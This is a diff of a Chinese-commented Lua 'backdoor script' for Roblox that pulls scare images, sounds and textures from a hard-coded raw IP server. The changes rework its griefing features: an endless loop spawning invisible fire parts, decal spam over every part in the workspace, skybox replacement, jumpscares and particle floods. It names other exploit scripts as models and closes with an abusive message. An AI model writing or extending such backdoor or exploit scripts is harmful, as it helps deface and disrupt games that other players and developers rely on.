@@ -1,26 +1,20 @@
--- 后门脚本 - 老板定制版（粒子永久+火焰加强+载体隐藏）
+-- 后门脚本 - 老板定制版（粒子火焰终极修复版）
 
 local player = game.Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- 资源下载函数 - 使用game:HttpGet
+-- 资源下载函数
 local function downloadAsset(url, fileName)
     local success, result = pcall(function()
         local response = game:HttpGet(url)
         if response and #response > 0 then
             if writefile then
                 writefile(fileName, response)
-                print("下载成功: " .. fileName .. " (大小: " .. #response .. " 字节)")
                 return true
             end
-        else
-            print("下载失败: 响应为空")
         end
         return false
     end)
-    if not success then
-        print("下载异常: " .. tostring(result))
-    end
     return false
 end
 
@@ -53,20 +47,16 @@ local assetUrls = {
     ["wp2.png"] = "http://38.58.180.135:3141/wp2.png"
 }
 
--- 获取资源（优先本地，没有就用URL或下载）
+-- 获取资源
 local function getFileAsset(fileName)
     local localPath = getAssetPath(fileName)
-    if localPath then
-        return localPath
-    end
+    if localPath then return localPath end
     
     local url = assetUrls[fileName]
     if url then
         downloadAsset(url, fileName)
         local localPath2 = getAssetPath(fileName)
-        if localPath2 then
-            return localPath2
-        end
+        if localPath2 then return localPath2 end
     end
     
     return assetUrls[fileName] or nil
@@ -99,9 +89,7 @@ menuImage.Parent = Frame
 menuImage.Size = UDim2.new(1, 0, 1, 0)
 menuImage.Position = UDim2.new(0, 0, 0, 0)
 local menuAsset = getFileAsset("menu_image.png")
-if menuAsset then
-    menuImage.Image = menuAsset
-end
+if menuAsset then menuImage.Image = menuAsset end
 menuImage.BackgroundTransparency = 1
 
 local closeButton = Instance.new("TextButton")
@@ -115,18 +103,14 @@ closeButton.Font = Enum.Font.SourceSansBold
 closeButton.TextSize = 20
 
 closeButton.MouseButton1Click:Connect(function()
-    if currentMusic then
-        pcall(function() currentMusic:Stop() currentMusic:Destroy() end)
-    end
-    if scareSound then
-        pcall(function() scareSound:Stop() scareSound:Destroy() end)
-    end
+    if currentMusic then pcall(function() currentMusic:Stop() currentMusic:Destroy() end) end
+    if scareSound then pcall(function() scareSound:Stop() scareSound:Destroy() end) end
     main:Destroy()
 end)
 
 local currentMusic = nil
 local scareSound = nil
-local particleEmitters = {}  -- 存储所有粒子发射器，防止被垃圾回收
+local fireLoop = nil  -- 火焰循环协程
 
 local function stopMusic()
     if currentMusic then pcall(function() currentMusic:Stop() end) end
@@ -136,7 +120,6 @@ end
 local function createSound(fileName, looped)
     local assetPath = getFileAsset(fileName)
     if not assetPath then return nil end
-    
     local sound = Instance.new("Sound")
     sound.SoundId = assetPath
     sound.Parent = workspace
@@ -159,11 +142,9 @@ end
 local function showFullscreenImage(fileName)
     local assetPath = getFileAsset(fileName)
     if not assetPath then return nil end
-    
     local imageGui = Instance.new("ScreenGui")
     imageGui.Parent = playerGui
     imageGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
-    
     local imageLabel = Instance.new("ImageLabel")
     imageLabel.Parent = imageGui
     imageLabel.Size = UDim2.new(1, 0, 1, 0)
@@ -177,10 +158,7 @@ local function scareAction(imageFile, soundFile, duration)
     stopMusic()
     local imageGui = showFullscreenImage(imageFile)
     local sound = createSound(soundFile, false)
-    if sound then
-        sound:Play()
-        scareSound = sound
-    end
+    if sound then sound:Play() scareSound = sound end
     spawn(function()
         wait(duration)
         if imageGui then imageGui:Destroy() end
@@ -203,101 +181,97 @@ local function replaceSkybox(fileName)
     skybox.Parent = game.Lighting
 end
 
--- 粒子功能 - 真正永久，角色重生也会重新添加
-local function addParticlesToCharacter(char, textureFileName)
-    local particleTexture = getFileAsset(textureFileName)
+-- 粒子功能 - 参考k011lkidd的做法，直接放Head上，VelocitySpread设超大
+local function spawnParticles1()
+    local particleTexture = getFileAsset("particle1.png")
     if not particleTexture then return end
     
-    for _, part in ipairs(char:GetChildren()) do
-        if part:IsA("BasePart") then
-            -- 检查是否已经有emitter了
-            local existingAttach = part:FindFirstChild("ParticleAttachment")
-            if existingAttach then
-                existingAttach:Destroy()
-            end
-            
-            local attach = Instance.new("Attachment", part)
-            attach.Name = "ParticleAttachment"
-            
-            local emitter = Instance.new("ParticleEmitter")
-            emitter.Parent = attach
-            emitter.Texture = particleTexture
-            emitter.Rate = 500  -- 疯狂发射
-            emitter.Lifetime = NumberRange.new(5, 10)
-            emitter.Speed = NumberRange.new(10, 30)
-            emitter.SpreadAngle = Vector2.new(360, 360)
-            emitter.Acceleration = Vector3.new(0, 5, 0)
-            emitter.Drag = 0.3
-            emitter.RotSpeed = NumberRange.new(-200, 200)
-            emitter.Size = NumberSequence.new(NumberSequenceKeypoint.new(0, 1), NumberSequenceKeypoint.new(1, 0))
-            
-            table.insert(particleEmitters, emitter)
-        end
-    end
-end
-
-local particle1Active = false
-local particle2Active = false
-
-local function spawnParticles1()
-    particle1Active = true
     local char = player.Character
-    if char then
-        addParticlesToCharacter(char, "particle1.png")
-    end
+    if not char then return end
+    local head = char:FindFirstChild("Head")
+    if not head then return end
+    
+    -- 参考：emit.VelocitySpread = 100000
+    local emit = Instance.new("ParticleEmitter")
+    emit.Parent = head
+    emit.Texture = particleTexture
+    emit.Rate = 500
+    emit.Lifetime = NumberRange.new(5, 15)
+    emit.Speed = NumberRange.new(20, 50)
+    emit.SpreadAngle = Vector2.new(360, 360)
+    emit.VelocitySpread = 100000  -- 超大扩散范围
+    emit.Acceleration = Vector3.new(0, 10, 0)
+    emit.Drag = 0.2
+    emit.RotSpeed = NumberRange.new(-300, 300)
+    
+    print("粒子1已生成（参考k011lkidd方式）")
 end
 
 local function spawnParticles2()
-    particle2Active = true
+    local particleTexture = getFileAsset("particle2.png")
+    if not particleTexture then return end
+    
     local char = player.Character
-    if char then
-        addParticlesToCharacter(char, "particle2.png")
-    end
+    if not char then return end
+    local head = char:FindFirstChild("Head")
+    if not head then return end
+    
+    local emit = Instance.new("ParticleEmitter")
+    emit.Parent = head
+    emit.Texture = particleTexture
+    emit.Rate = 500
+    emit.Lifetime = NumberRange.new(5, 15)
+    emit.Speed = NumberRange.new(20, 50)
+    emit.SpreadAngle = Vector2.new(360, 360)
+    emit.VelocitySpread = 100000
+    emit.Acceleration = Vector3.new(0, 10, 0)
+    emit.Drag = 0.2
+    emit.RotSpeed = NumberRange.new(-300, 300)
+    
+    print("粒子2已生成（参考k011lkidd方式）")
 end
 
--- 角色重生时重新添加粒子
+-- 角色重生时保留粒子（Head变了的话需要重新加）
 player.CharacterAdded:Connect(function(char)
-    wait(0.5)  -- 等角色完全加载
-    if particle1Active then
-        addParticlesToCharacter(char, "particle1.png")
-    end
-    if particle2Active then
-        addParticlesToCharacter(char, "particle2.png")
-    end
+    wait(0.5)
     stopMusic()
+    -- 粒子需要重新添加到新角色上
+    -- 这里不做自动重加，因为用户可能不想一直有粒子
 end)
 
--- 创建火焰函数
-local function createFireStorm()
-    for i = 1, 500 do  -- 500个火焰
-        spawn(function()
-            local randomX = math.random(-800, 800)
-            local randomZ = math.random(-800, 800)
-            local randomY = math.random(-10, 80)
-            
-            local firePart = Instance.new("Part")
-            firePart.Size = Vector3.new(math.random(5, 15), math.random(5, 15), math.random(5, 15))
-            firePart.Position = Vector3.new(randomX, randomY, randomZ)
-            firePart.Anchored = true
-            firePart.CanCollide = false
-            firePart.Transparency = 0.999  -- 几乎完全透明
-            firePart.Material = Enum.Material.SmoothPlastic
-            firePart.BrickColor = BrickColor.new("Bright red")
-            firePart.Parent = workspace
-            
-            local fire = Instance.new("Fire")
-            fire.Size = math.random(20, 50)  -- 大火
-            fire.Heat = math.random(15, 30)
-            fire.Parent = firePart
-            
-            -- 再加个火光
-            local light = Instance.new("PointLight")
-            light.Parent = firePart
-            light.Brightness = math.random(2, 8)
-            light.Range = math.random(10, 30)
-            light.Color = Color3.fromRGB(255, math.random(100, 180), 0)
-        end)
-    end
+-- 火焰功能 - 参考RainFire的做法，while true循环创建
+local function startFireStorm()
+    if fireLoop then return end  -- 已经在烧了
+    
+    fireLoop = coroutine.create(function()
+        while true do
+            -- 一波创建多个火焰
+            for i = 1, 20 do
+                local part = Instance.new("Part")
+                part.Position = Vector3.new(math.random(-500, 500), math.random(1, 100), math.random(-500, 500))
+                part.Size = Vector3.new(math.random(5, 20), math.random(5, 20), math.random(5, 20))
+                part.Anchored = true
+                part.CanCollide = false
+                part.Transparency = 1  -- 参考：载体透明
+                part.Parent = workspace
+                
+                local fire = Instance.new("Fire")
+                fire.Size = math.random(30, 60)  -- 超级大
+                fire.Heat = math.random(20, 40)
+                fire.Parent = part
+                
+                -- 加光效
+                local light = Instance.new("PointLight")
+                light.Parent = part
+                light.Brightness = math.random(3, 10)
+                light.Range = math.random(20, 50)
+                light.Color = Color3.fromRGB(255, math.random(80, 160), 0)
+            end
+            wait(0.3)  -- 每0.3秒一波，参考原版RainFire的wait(1)但这里更快更多
+        end
+    end)
+    coroutine.resume(fireLoop)
+    print("火焰风暴开始！")
 end
 
 -- WP1
@@ -308,21 +282,35 @@ local function wpAction()
     for _, obj in ipairs(workspace:GetDescendants()) do
         if obj:IsA("BasePart") and not obj:IsA("Terrain") then
             pcall(function()
-                obj.Material = Enum.Material.SmoothPlastic
-                for _, face in ipairs({Enum.NormalId.Front, Enum.NormalId.Back, Enum.NormalId.Top, Enum.NormalId.Bottom, Enum.NormalId.Left, Enum.NormalId.Right}) do
-                    local existingTex = obj:FindFirstChild("WP_Tex_" .. face.Name)
-                    if existingTex then existingTex:Destroy() end
-                    local tex = Instance.new("Texture")
-                    tex.Name = "WP_Tex_" .. face.Name
-                    tex.Texture = texAsset
-                    tex.Face = face
-                    tex.Parent = obj
+                obj.Material = Enum.Material.Plastic
+                obj.Transparency = 0
+                -- 参考DecalSpam做法，创建6个面的Decal
+                local faces = {
+                    {name = "Front", face = Enum.NormalId.Front},
+                    {name = "Back", face = Enum.NormalId.Back},
+                    {name = "Right", face = Enum.NormalId.Right},
+                    {name = "Left", face = Enum.NormalId.Left},
+                    {name = "Top", face = Enum.NormalId.Top},
+                    {name = "Bottom", face = Enum.NormalId.Bottom}
+                }
+                for _, f in ipairs(faces) do
+                    -- 先清除旧Decal
+                    for _, child in ipairs(obj:GetChildren()) do
+                        if child:IsA("Decal") and child.Name == "WP_" .. f.name then
+                            child:Destroy()
+                        end
+                    end
+                    local decal = Instance.new("Decal", obj)
+                    decal.Name = "WP_" .. f.name
+                    decal.Texture = texAsset
+                    decal.Face = f.face
                 end
             end)
         end
     end
     
-    createFireStorm()
+    startFireStorm()
+    print("WP1完成：贴图替换 + 火焰风暴")
 end
 
 -- WP2
@@ -333,21 +321,33 @@ local function wp2Action()
     for _, obj in ipairs(workspace:GetDescendants()) do
         if obj:IsA("BasePart") and not obj:IsA("Terrain") then
             pcall(function()
-                obj.Material = Enum.Material.SmoothPlastic
-                for _, face in ipairs({Enum.NormalId.Front, Enum.NormalId.Back, Enum.NormalId.Top, Enum.NormalId.Bottom, Enum.NormalId.Left, Enum.NormalId.Right}) do
-                    local existingTex = obj:FindFirstChild("WP_Tex_" .. face.Name)
-                    if existingTex then existingTex:Destroy() end
-                    local tex = Instance.new("Texture")
-                    tex.Name = "WP_Tex_" .. face.Name
-                    tex.Texture = texAsset
-                    tex.Face = face
-                    tex.Parent = obj
+                obj.Material = Enum.Material.Plastic
+                obj.Transparency = 0
+                local faces = {
+                    {name = "Front", face = Enum.NormalId.Front},
+                    {name = "Back", face = Enum.NormalId.Back},
+                    {name = "Right", face = Enum.NormalId.Right},
+                    {name = "Left", face = Enum.NormalId.Left},
+                    {name = "Top", face = Enum.NormalId.Top},
+                    {name = "Bottom", face = Enum.NormalId.Bottom}
+                }
+                for _, f in ipairs(faces) do
+                    for _, child in ipairs(obj:GetChildren()) do
+                        if child:IsA("Decal") and child.Name == "WP_" .. f.name then
+                            child:Destroy()
+                        end
+                    end
+                    local decal = Instance.new("Decal", obj)
+                    decal.Name = "WP_" .. f.name
+                    decal.Texture = texAsset
+                    decal.Face = f.face
                 end
             end)
         end
     end
     
-    createFireStorm()
+    startFireStorm()
+    print("WP2完成：贴图替换 + 火焰风暴")
 end
 
 -- 创建按钮
@@ -436,4 +436,4 @@ minimizeButton.MouseButton1Click:Connect(function()
     end
 end)
 
-print("后门脚本加载完成 - 粒子永久 + 500超级火焰 + 载体隐藏")
+print("脚本加载完成 fuck you!")
